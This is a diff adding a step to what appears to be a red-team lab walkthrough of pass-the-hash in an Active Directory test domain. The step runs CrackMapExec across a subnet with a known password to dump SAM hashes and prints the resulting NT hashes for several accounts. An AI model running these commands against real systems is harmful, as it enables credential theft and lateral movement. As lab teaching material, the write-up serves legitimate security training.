@@ -55,3 +55,36 @@ Windows uses MD4 to turn your password into a hash (this is the NT hash). That h
 | Victim  | Windows 10       | Domain joined machine | 192.168.5.135 |
  ```
 
+## Step 1 — First Scan With CrackMapExec and Pull Hashes
+
+I had rahimkhan's password from earlier. Ran CrackMapExec across the whole subnet to see which machines I could get into, and added --sam to pull hashes from any machine it logged into:
+
+```bash
+crackmapexec smb 192.168.5.0/24 -u rahimkhan -d READTEAMBD.local -p Password1 --sam
+```
+Output:
+
+```
+SMB         192.168.5.136   445    VICTIM-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:VICTIM-2) (domain:READTEAMBD.local) (signing:False) (SMBv1:False)
+SMB         192.168.5.135   445    VICTIM-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:VICTIM-1) (domain:READTEAMBD.local) (signing:False) (SMBv1:False)
+SMB         192.168.5.134   445    REDTEAMBD-DC     [*] Windows Server 2022 Build 20348 x64 (name:REDTEAMBD-DC) (domain:READTEAMBD.local) (signing:True) (SMBv1:False)
+SMB         192.168.5.136   445    VICTIM-2         [+] READTEAMBD.local\rahimkhan:Password1 (Pwn3d!)
+SMB         192.168.5.135   445    VICTIM-1         [+] READTEAMBD.local\rahimkhan:Password1 (Pwn3d!)
+SMB         192.168.5.134   445    REDTEAMBD-DC     [+] READTEAMBD.local\rahimkhan:Password1 
+SMB         192.168.5.136   445    VICTIM-2         [+] Dumping SAM hashes
+SMB         192.168.5.135   445    VICTIM-1         [+] Dumping SAM hashes
+SMB         192.168.5.135   445    VICTIM-1         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+SMB         192.168.5.135   445    VICTIM-1         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.5.135   445    VICTIM-1         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.5.135   445    VICTIM-1         WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58de7b52b01e171824c8aeaa55fb1a89:::
+SMB         192.168.5.135   445    VICTIM-1         rahim:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+SMB         192.168.5.135   445    VICTIM-1         [+] Added 5 SAM hashes to the database
+SMB         192.168.5.136   445    VICTIM-2         Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.5.136   445    VICTIM-2         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.5.136   445    VICTIM-2         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.5.136   445    VICTIM-2         WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6f3ff0667b23a61adbffbe71a1e8dd8b:::
+SMB         192.168.5.136   445    VICTIM-2         defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:337b1d18e8d0a8405c907048fdfbbae2:::
+SMB         192.168.5.136   445    VICTIM-2         karim:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+SMB         192.168.5.136   445    VICTIM-2         [+] Added 6 SAM hashes to the database
+```
+                                                                                              
